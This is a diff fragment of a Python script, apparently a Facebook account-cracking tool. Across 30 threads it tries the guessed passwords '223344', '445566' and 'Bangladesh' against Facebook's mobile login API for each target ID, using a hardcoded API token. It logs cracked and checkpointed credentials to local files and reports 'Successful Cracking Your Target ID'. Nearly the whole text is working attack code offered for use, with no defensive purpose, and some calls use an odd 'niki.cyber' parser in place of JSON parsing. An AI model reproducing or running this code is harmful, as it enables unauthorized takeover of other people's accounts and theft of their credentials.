+		                                    ok.write(uid+" = "+pass4+"\n")
+
+ 
+
+		                                    ok.close()
+
+ 
+
+		                                    oks.append(uid)
+
+ 
+
+		                                else:
+
+ 
+
+		                                    pass5="223344"
+
+ 
+
+		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
+
+ 
+
+		                                    d=json.loads(q)
+
+ 
+
+		                                    if 'www.facebook.com' in d['error_msg']:
+
+ 
+
+		                                        print("\033[1;93m[NIKI-CP] "+uid+" = "+pass5)
+
+ 
+
+		                                        cp=open("nikicp.txt","a")
+
+ 
+
+		                                        cp.write(uid+" = "+pass5+"\n")
+
+ 
+
+		                                        cp.close()
+
+ 
+
+		                                        cps.append(uid)
+
+ 
+
+		                                    else:
+
+ 
+
+		                                        if 'access_token' in d:
+
+ 
+
+		                                            print("\x1b[1;92m[NIKI-OK] "+uid+" = "+pass5+"\x1b[1;0m")
+
+ 
+
+		                                            ok=open("nikiok.txt","a")
+
+ 
+
+		                                            ok.write(uid+" = "+pass5+"\n")
+
+ 
+
+		                                            ok.close()
+
+ 
+
+		                                            oks.append(uid)
+
+ 
+
+		                                        else:
+
+ 
+
+		                                            pass6="445566"
+
+ 
+
+		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
+
+ 
+
+		                                            d=niki.cyber(q)
+
+ 
+
+		                                            if 'www.facebook.com' in d['error_msg']:
+
+ 
+
+		                                                print("\033[1;93m[NIKI-CP] "+uid+" = "+pass6)
+
+ 
+
+		                                                cp=open("nikicp.txt","a")
+
+ 
+
+		                                                cp.write(uid+" = "+pass6+"\n")
+
+ 
+
+		                                                cp.close()
+
+ 
+
+		                                                cps.append(uid)
+
+ 
+
+		                                            else:
+
+ 
+
+		                                                if 'access_token' in d:
+
+ 
+
+		                                                    print("\x1b[1;92m[NIKI-OK] "+uid+" = "+pass6+"\x1b[1;0m")
+
+ 
+
+		                                                    ok=open("nikiok.txt","a")
+
+ 
+
+		                                                    ok.write(uid+" = "+pass6+"\n")
+
+ 
+
+		                                                    ok.close()
+
+ 
+
+		                                                    oks.append(uid)
+
+ 
+
+		                                                else:
+
+ 
+
+		                                                    pass7="Bangladesh"
+
+ 
+
+		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
+
+ 
+
+		                                                    d=niki.cyber(q)
+
+ 
+
+		                                                    if 'www.facebook.com' in d['error_msg']:
+
+ 
+
+		                                                        print("\033[1;93m[NIKI-CP] "+uid+" = "+pass7)
+
+ 
+
+		                                                        cp=open("nikicp.txt","a")
+
+ 
+
+		                                                        cp.write(uid+" = "+pass7+"\n")
+
+ 
+
+		                                                        cp.close()
+
+ 
+
+		                                                        cps.append(uid)
+
+ 
+
+		                                                    else:
+
+ 
+
+		                                                        if 'access_token' in d:
+
+ 
+
+		                                                            print("\x1b[1;92m[NIKI-OK] "+uid+" = "+pass7+"\x1b[1;0m")
+
+ 
+
+		                                                            ok=open("nikiok.txt","a")
+
+ 
+
+		                                                            ok.write(uid+" = "+pass7+"\n")
+
+ 
+
+		                                                            ok.close()
+
+ 
+
+		                                                            oks.append(uid)
+
+ 
+
+									
+
+ 
+
+															
+
+ 
+
+		except:
+
+ 
+
+			pass
+
+ 
+
+		
+
+ 
+
+	p = ThreadPool(30)
+
+ 
+
+	p.map(main, id)
+
+ 
+
+	print (" ")
+
+ 
+
+	print (47*"-")
+
+ 
+
+	print ("[!] Process has completed")
+
+ 
+
+	print ("[!] Successful Cracking Your Target ID Total CP/OK : "+str(len(cps)) + "/"+str(len(oks)))
+
+ 
+
+	print (47*"-")
+
+ 
+
+	raw_input("\t\x1b[0;92mPress Enter To Main Menu Back")
+
+ 
+
+	menu()
+
+ 
+
+	
+
+ 
+
 if __name__ == '__main__':
-    login()
+
+ 
+
+    main()
